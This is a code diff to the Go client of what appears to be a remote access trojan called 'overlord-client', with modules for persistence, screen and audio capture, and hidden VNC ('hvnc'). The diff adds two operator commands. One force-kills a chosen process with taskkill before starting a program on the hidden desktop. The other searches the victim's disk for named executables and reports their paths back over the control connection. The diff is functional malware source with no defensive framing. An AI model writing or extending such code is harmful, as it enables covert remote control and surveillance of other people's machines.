@@ -6,6 +6,7 @@ import (
 	"errors"
 	"log"
 	"os"
+	"os/exec"
 	goruntime "runtime"
 	"strconv"
 	"strings"
@@ -16,6 +17,7 @@ import (
 	"overlord-client/cmd/agent/audio"
 	"overlord-client/cmd/agent/capture"
 	"overlord-client/cmd/agent/console"
+	"overlord-client/cmd/agent/filesearch"
 	"overlord-client/cmd/agent/persistence"
 	"overlord-client/cmd/agent/plugins"
 	"overlord-client/cmd/agent/runtime"
@@ -1284,17 +1286,58 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 	case "hvnc_start_process":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		filePath := ""
+		killExe := ""
 		if payload != nil {
 			if v, ok := payload["path"].(string); ok {
 				filePath = v
 			}
+			if v, ok := payload["kill_exe"].(string); ok {
+				killExe = v
+			}
 		}
-		log.Printf("hvnc: start process %q", filePath)
+		log.Printf("hvnc: start process %q (kill_exe=%q)", filePath, killExe)
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_start_process", nil, func() {
+			if killExe != "" {
+				out, err := exec.Command("taskkill", "/f", "/im", killExe).CombinedOutput()
+				log.Printf("hvnc: taskkill /f /im %s: %s (err=%v)", killExe, strings.TrimSpace(string(out)), err)
+			}
 			if err := capture.StartHVNCProcess(filePath); err != nil {
 				log.Printf("hvnc: start process failed for %q: %v", filePath, err)
 			}
+		})
+		return nil
+
+	case "hvnc_lookup":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		exeName := ""
+		if payload != nil {
+			if v, ok := payload["exe"].(string); ok {
+				exeName = v
+			}
+		}
+		if exeName == "" {
+			sendCommandResultSafe(env, cmdID, false, "no exe name provided")
+			return nil
+		}
+		log.Printf("hvnc: lookup exe %q", exeName)
+		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("hvnc_lookup", nil, func() {
+			filesearch.LookupExe(exeName, 8, func(path string) {
+				_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCLookupResult{
+					Type: "hvnc_lookup_result",
+					Exe:  exeName,
+					Path: path,
+					Done: false,
+				})
+			})
+			_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCLookupResult{
+				Type: "hvnc_lookup_result",
+				Exe:  exeName,
+				Path: "",
+				Done: true,
+			})
+			log.Printf("hvnc: lookup complete for %q", exeName)
 		})
 		return nil
 
